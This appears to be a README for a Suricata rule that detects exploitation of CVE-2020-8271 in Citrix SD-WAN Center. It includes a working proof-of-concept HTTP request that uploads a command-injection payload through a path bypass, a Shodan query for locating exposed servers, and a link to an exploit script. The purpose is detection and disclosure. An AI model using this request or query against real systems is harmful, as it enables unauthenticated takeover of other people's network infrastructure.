## Overview
CVE-2020-8271 allows attackers to get remote code execution on Citrix SD-WAN Center without authenticating. Any anonymous user could upload a file contains commands and then execute it via a Path Traversal vulnerability.  

In this Suricata rule, I try to capture the activity of uploading the malicious file. Because of no credentials, attackers must use the crafted URL in which they have the special string "**://?**". The uploaded file is inside the directory **/home/talariuser/uploaded_license_files/** on the server.  

Please note that the web interface of Citrix SD-WAN Center uses **HTTPS** (port 443 by default).
### Bonus for bug bounty hunters
Shodan search for Citrix SD-WAN Center:  
**http.favicon.hash:-1272756243 http.title:"SD-WAN"**

## Proof of Concept
```
POST /aaaaaaaaaaaa/://?/collector/licensing/upload HTTP/1.1
Host: example.com
Content-Length: 237
Content-Type: multipart/form-data; boundary=8823e25728843f7b9d2deadb77d34572

--8823e25728843f7b9d2deadb77d34572
Content-Disposition: form-data; name="name"

test
--8823e25728843f7b9d2deadb77d34572
Content-Disposition: form-data; name="file"; filename="test"

;whoami;
--8823e25728843f7b9d2deadb77d34572--
```

## References
* https://medium.com/realmodelabs/sd-pwn-part-2-citrix-sd-wan-center-another-network-takeover-a9c950a1a27c
* https://github.com/RealmodeLabs/SD-PWN/blob/master/citrix_sdwan_center_rce.py